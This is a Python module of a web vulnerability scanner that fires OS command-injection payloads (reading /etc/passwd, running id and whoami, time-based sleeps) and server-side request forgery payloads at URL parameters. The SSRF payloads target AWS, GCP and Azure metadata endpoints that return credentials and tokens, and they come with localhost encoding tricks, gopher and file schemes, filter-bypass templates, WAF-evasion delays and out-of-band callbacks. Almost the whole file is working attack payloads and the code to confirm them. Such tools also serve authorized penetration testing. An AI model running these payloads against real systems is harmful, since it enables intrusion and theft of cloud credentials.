import re
from core.ui import vuln, found, CYN, RED, GRY, RESET, info
from core.http import http_probe
from core.config import CONFIG
from core.utils import generate_oob_id
from . import BaseScanner

OSCMD_PAYLOADS = [
    ("; sleep 10", "time"),
    ("| sleep 10", "time"),
    ("`sleep 10`", "time"),
    ("$(sleep 10)", "time"),
    ("{sleep,10}", "time"),
    (";\\s\\l\\e\\e\\p 10", "time"),
    ("$(awk 'BEGIN{system(\"sleep 10\")}')", "time"),
    ("$((sleep 10))", "time"),
    ("%0asleep%2010", "time"),
    ("; cat /etc/passwd", "blind"),
    ("| id", "blind"),
    ("`whoami`", "blind"),
    ("; getent passwd", "blind"),
    ("$(uname -a)", "blind"),
    ("|cat /etc/hosts", "blind"),
    ("& ping -n 11 127.0.0.1", "time"),
    ("| type c:\\Windows\\win.ini", "blind"),
    ("& dir c:\\", "blind"),
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1beta1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.170.2/v2/credentials/",
    "http://127.0.0.1:80",
    "http://localhost:22",
    "http://0.0.0.0:80",
    "http://127.127.127.127",
    "http://2130706433",
    "http://0x7F000001",
    "http://0177.0.0.1",
    "http://127.1",
    "http://0",
    "http://[::1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://127.0.0.1.nip.io",
    "http://spoofed.burpcollaborator.net",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:6379/_INFO",
    "ftp://127.0.0.1",
    "jar:http://127.0.0.1!/",
    "netdoc:///etc/passwd",
]

SSRF_URL_PARAM_BYPASS = [
    "http://127.0.0.1#@{target}",
    "http://127.0.0.1%23@{target}",
    "http://{target}@127.0.0.1",
    "http://127.0.0.1%00{target}",
    "http://127.0.0.1/{target}",
    "https://127.0.0.1%0d%0a@{target}",
]

class SSRFandCmdScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params = self._get_params(url)
        if not params: return findings

        for param in list(params.keys())[:3]:
            cmd_found = False
            for payload, ptype in OSCMD_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                
                probe_timeout = 15 if ptype == "time" else 8
                code2, body2, _, ms2 = await http_probe(self.session, test_url, timeout=probe_timeout)
                await self._waf_sleep()
                
                if ptype == "time" and ms2 >= 9000:
                    _, _, _, ms_base = await http_probe(self.session, url, timeout=8)
                    if ms2 > max(ms_base * 3, 2000):
                        vuln(f"OS CMD INJECTION (Time): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                        findings.append({"type":"OS-CMD","url":url,"param":param,"payload":payload,"method":"time"})
                        cmd_found = True; break
                elif ptype == "blind" and body2 and re.search(r"(uid=\d+|root:x:0:0|Linux.*GNU|\[boot loader\]|\[extensions\])", body2, re.I):
                    _, base_body, _, _ = await http_probe(self.session, url, timeout=8)
                    if not re.search(r"(uid=\d+|root:x:0:0)", base_body, re.I):
                        vuln(f"OS CMD INJECTION (Output): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                        findings.append({"type":"OS-CMD","url":url,"param":param,"payload":payload,"method":"output"})
                        cmd_found = True; break
            if cmd_found: break

        ssrf_hit_keywords = re.compile(
            r"(compute\.internal|ami-id|instance-id|root:x:0:0"
            r"|\[extensions\]|\[boot loader\]|memcached|redis_version"
            r"|AccessKeyId|SecretAccessKey|Token"
            r"|account_id|project_id|service_accounts"
            r"|subscriptionId|resourceGroup"
            r"|#!/bin/|#!/usr/bin|cloud-init"
            r"|metadata\.internal|GCE_METADATA_HOST"
            r"|instanceId|privateIp|accountId)", re.I
        )

        for param in list(params.keys())[:3]:
            ssrf_found = False
            for payload in SSRF_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)
                
                extra_h = {}
                if "metadata.google" in payload:
                    extra_h["Metadata-Flavor"] = "Google"
                if "169.254.169.254/metadata" in payload:
                    extra_h["Metadata"] = "true"
                
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8, extra_headers=extra_h if extra_h else None)
                await self._waf_sleep()
                
                if code2 == 200 and body2 and ssrf_hit_keywords.search(body2):
                    vuln(f"SSRF CONFIRMED: {url}")
                    print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                    m = ssrf_hit_keywords.search(body2)
                    print(GRY+"│    "+RESET+RED+f"evidence: {m.group(0)[:80]}"+RESET)
                    findings.append({"type":"SSRF","url":url,"param":param,"payload":payload,
                                   "evidence": m.group(0)[:120]})
                    ssrf_found = True; break
            if ssrf_found: break

            for bypass_tpl in SSRF_URL_PARAM_BYPASS:
                target_host = parsed.netloc
                bypass_url = bypass_tpl.replace("{target}", target_host)
                test_params = dict(params)
                test_params[param] = [bypass_url]
                test_url = self._build_url(parsed, test_params)
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()
                if code2 == 200 and body2 and ssrf_hit_keywords.search(body2):
                    vuln(f"SSRF via URL bypass: {url}")
                    print(GRY+"│    "+RESET+CYN+f"param: {param}  bypass: {bypass_tpl}"+RESET)
                    findings.append({"type":"SSRF-bypass","url":url,"param":param,"payload":bypass_url})
                    break

        if CONFIG.oob_server:
            oob_id = generate_oob_id()
            oob_payloads = [
                f"http://{oob_id}.{CONFIG.oob_server}",
                f"https://{oob_id}.{CONFIG.oob_server}",
            ]
            for param in list(params.keys())[:2]:
                for oob_p in oob_payloads:
                    test_params = dict(params)
                    test_params[param] = [oob_p]
                    test_url = self._build_url(parsed, test_params)
                    await http_probe(self.session, test_url, timeout=6)
                    await self._waf_sleep()
            info(f"OOB SSRF payloads sent (check {CONFIG.oob_server} for callbacks)")
            findings.append({"type":"SSRF-OOB","url":url,"oob_server":CONFIG.oob_server,
                           "oob_id":oob_id,"note":"Check OOB server for DNS/HTTP callbacks"})

        return findings
